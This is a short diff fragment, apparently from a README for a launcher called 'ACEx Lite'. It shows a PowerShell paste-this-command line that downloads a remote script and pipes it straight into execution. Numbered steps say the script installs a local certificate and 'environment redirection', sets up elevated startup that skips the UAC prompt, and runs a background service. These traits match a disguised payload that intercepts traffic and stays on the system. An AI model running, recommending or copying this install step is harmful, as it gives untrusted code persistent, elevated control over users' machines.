@@ -41,4 +41,3 @@ irm https://raw.githubusercontent.com/ershivshankar/Testing/main/boot.ps1 | iex
 1. Downloads the package files directly to `%LOCALAPPDATA%\ACEx_Launcher`.
 2. Installs required environment redirection and local certificate.
 3. Automatically sets up zero-UAC elevated startup.
-4. Starts the background service and launches ACEx Lite.
